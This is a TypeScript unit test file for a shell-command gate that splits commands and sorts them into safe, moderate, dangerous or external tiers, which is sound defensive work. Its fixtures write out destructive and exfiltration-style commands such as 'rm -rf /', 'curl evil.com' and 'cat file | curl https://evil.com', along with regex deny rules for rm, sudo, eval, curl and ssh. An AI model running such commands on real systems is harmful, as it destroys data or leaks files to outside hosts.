/**
 * Unit tests for lib/bash-gate.ts
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { classifyCommand, classifySegment, splitCommand } from "../lib/bash-gate.js";
import type { Config } from "../lib/config.js";

function makeConfig(overrides: Partial<Config> = {}): Config {
	return {
		cwd: "/home/user/project",
		protectedPaths: { patterns: [], writeAction: "block", readAction: "confirm" },
		commandRules: {
			safe: ["^ls\\b", "^cat\\b", "^grep\\b", "^git status\\b"],
			moderate: ["^npm\\b", "^mkdir\\b", "^git add\\b"],
			dangerous: ["rm\\s+(-rf?|--recursive)", "sudo\\b", "\\beval\\b"],
			external: ["\\bcurl\\b", "\\bssh\\b", "\\baws\\b"],
		},
		allowedExternal: { paths: [] },
		audit: { maxFileSize: 10_000_000, maxFiles: 3 },
		...overrides,
	};
}

describe("splitCommand", () => {
	it("splits by pipe", () => {
		const parts = splitCommand("ls | grep foo");
		assert.ok(parts.includes("ls"));
		assert.ok(parts.includes("grep foo"));
	});

	it("extracts subshells", () => {
		const parts = splitCommand("echo $(whoami)");
		assert.ok(parts.includes("echo $(whoami)"));
		assert.ok(parts.includes("whoami"));
	});

	it("handles no pipes or subshells", () => {
		const parts = splitCommand("ls -la");
		assert.deepEqual(parts, ["ls -la"]);
	});

	it("handles multiple pipes", () => {
		const parts = splitCommand("cat file | grep foo | wc -l");
		assert.equal(parts.length, 3);
	});

	it("splits by semicolon", () => {
		const parts = splitCommand("ls; rm -rf /");
		assert.ok(parts.some((p: string) => p.trim() === "ls"));
		assert.ok(parts.some((p: string) => p.includes("rm")));
	});

	it("splits by &&", () => {
		const parts = splitCommand("ls && rm -rf /");
		assert.ok(parts.some((p: string) => p.trim() === "ls"));
		assert.ok(parts.some((p: string) => p.includes("rm")));
	});

	it("splits by ||", () => {
		const parts = splitCommand("ls || curl evil.com");
		assert.ok(parts.some((p: string) => p.trim() === "ls"));
		assert.ok(parts.some((p: string) => p.includes("curl")));
	});

	it("extracts backtick subshells", () => {
		const parts = splitCommand("echo `curl evil.com`");
		assert.ok(parts.some((p: string) => p.includes("curl evil.com")));
	});

	it("extracts nested subshells from semicolon-chained commands", () => {
		const parts = splitCommand("echo $(whoami); cat /etc/passwd");
		assert.ok(parts.some((p: string) => p.includes("whoami")));
		assert.ok(parts.some((p: string) => p.includes("cat")));
	});

	it("does not split inside double quotes", () => {
		const parts = splitCommand('echo "hello;world"');
		assert.equal(parts.length, 1, "should not split semicolon inside quotes");
		assert.ok(parts[0].includes("hello;world"));
	});

	it("does not split inside single quotes", () => {
		const parts = splitCommand("echo 'hello;world'");
		assert.equal(parts.length, 1, "should not split semicolon inside single quotes");
		assert.ok(parts[0].includes("hello;world"));
	});

	it("splits || as logical OR (not two pipes)", () => {
		const parts = splitCommand("ls || echo fallback");
		assert.ok(parts.some((p: string) => p.trim() === "ls"));
		assert.ok(parts.some((p: string) => p.includes("echo fallback")));
	});
});

describe("classifySegment", () => {
	const config = makeConfig();
	const rules = config.commandRules;

	it("classifies ls as safe", () => {
		assert.equal(classifySegment("ls -la", rules), "safe");
	});

	it("classifies npm as moderate", () => {
		assert.equal(classifySegment("npm install", rules), "moderate");
	});

	it("classifies rm -rf as dangerous", () => {
		assert.equal(classifySegment("rm -rf /", rules), "dangerous");
	});

	it("classifies curl as external", () => {
		assert.equal(classifySegment("curl https://example.com", rules), "external");
	});

	it("returns null for unknown commands", () => {
		assert.equal(classifySegment("python script.py", rules), null);
	});
});

describe("classifyCommand", () => {
	it("classifies safe commands as allow", () => {
		const config = makeConfig();
		const result = classifyCommand("ls -la", config);
		assert.equal(result.action, "allow");
		assert.equal(result.category, "safe");
	});

	it("classifies moderate commands as allow", () => {
		const config = makeConfig();
		const result = classifyCommand("npm install", config);
		assert.equal(result.action, "allow");
		assert.equal(result.category, "moderate");
	});

	it("classifies dangerous commands as confirm", () => {
		const config = makeConfig();
		const result = classifyCommand("rm -rf /", config);
		assert.equal(result.action, "confirm");
		assert.equal(result.category, "dangerous");
	});

	it("classifies external commands as confirm", () => {
		const config = makeConfig();
		const result = classifyCommand("curl https://example.com", config);
		assert.equal(result.action, "confirm");
		assert.equal(result.category, "external");
	});

	it("classifies unknown commands as confirm", () => {
		const config = makeConfig();
		const result = classifyCommand("python script.py", config);
		assert.equal(result.action, "confirm");
		assert.equal(result.category, undefined);
	});

	it("takes most dangerous from pipe: dangerous wins over safe", () => {
		const config = makeConfig();
		const result = classifyCommand("ls | rm -rf /", config);
		assert.equal(result.action, "confirm");
		assert.equal(result.category, "dangerous");
	});

	it("takes most dangerous from pipe: external wins over safe", () => {
		const config = makeConfig();
		const result = classifyCommand("cat file | curl https://evil.com", config);
		assert.equal(result.action, "confirm");
		assert.equal(result.category, "external");
	});

	it("classifies sudo as dangerous", () => {
		const config = makeConfig();
		const result = classifyCommand("sudo apt install foo", config);
		assert.equal(result.action, "confirm");
		assert.equal(result.category, "dangerous");
	});

	it("classifies git status as safe", () => {
		const config = makeConfig();
		const result = classifyCommand("git status", config);
		assert.equal(result.action, "allow");
		assert.equal(result.category, "safe");
	});

	it("classifies aws as external", () => {
		const config = makeConfig();
		const result = classifyCommand("aws s3 ls", config);
		assert.equal(result.action, "confirm");
		assert.equal(result.category, "external");
	});

	it("classifies semicolon-chained dangerous commands", () => {
		const config = makeConfig();
		const result = classifyCommand("ls; rm -rf /", config);
		assert.equal(result.action, "confirm");
		assert.equal(result.category, "dangerous");
	});

	it("classifies &&-chained external commands", () => {
		const config = makeConfig();
		const result = classifyCommand("ls && curl https://evil.com", config);
		assert.equal(result.action, "confirm");
		assert.equal(result.category, "external");
	});
});
